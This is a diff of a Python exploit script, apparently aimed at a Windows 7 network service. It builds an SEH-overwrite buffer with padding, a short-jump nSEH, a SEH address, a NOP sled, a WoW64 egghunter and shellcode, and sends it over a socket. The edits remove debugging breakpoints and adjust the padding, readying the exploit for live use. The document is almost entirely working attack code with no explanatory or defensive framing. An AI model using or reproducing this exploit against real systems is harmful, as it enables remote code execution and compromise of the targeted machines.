@@ -9,7 +9,7 @@ socket.connect((ip , 33))
 
 # evil = "A"* 330
 junk = "A" * 50
-morejunk = "B" * 14
+morejunk = "B" * 15
 nseh = "\xeb\x06\x90\x90"
 seh = "\xdb\x65\x41\x00" #004165db
 nops = "\x90"*100
@@ -17,7 +17,7 @@ nops = "\x90"*100
 
 #modern egghunter for wow64 - Windows 7
 eggh = (
-"\xCC"  # Int 3
+# "\xCC"  # Int 3
 "\x31\xdb"                            # XOR EBX, EBX
 "\x53"                                # PUSH EBX
 "\x53"                                # PUSH EBX
@@ -46,7 +46,7 @@ eggh = (
 "\xFF\xE7"                            # JMP EDI
 )
 shellcode = (
-"\xCC\xe8\x00\x00\x00\x00\x5a\x8d\x52"
+"\xe8\x00\x00\x00\x00\x5a\x8d\x52"
 "\xfb\x52\xbb\x8e\xfe\x1f\x4b\xe8"
 "\x32\x00\x00\x00\x5a\x55\x52\x89"
 "\xc5\x8d\xb2\xed\x00\x00\x00\x8d"
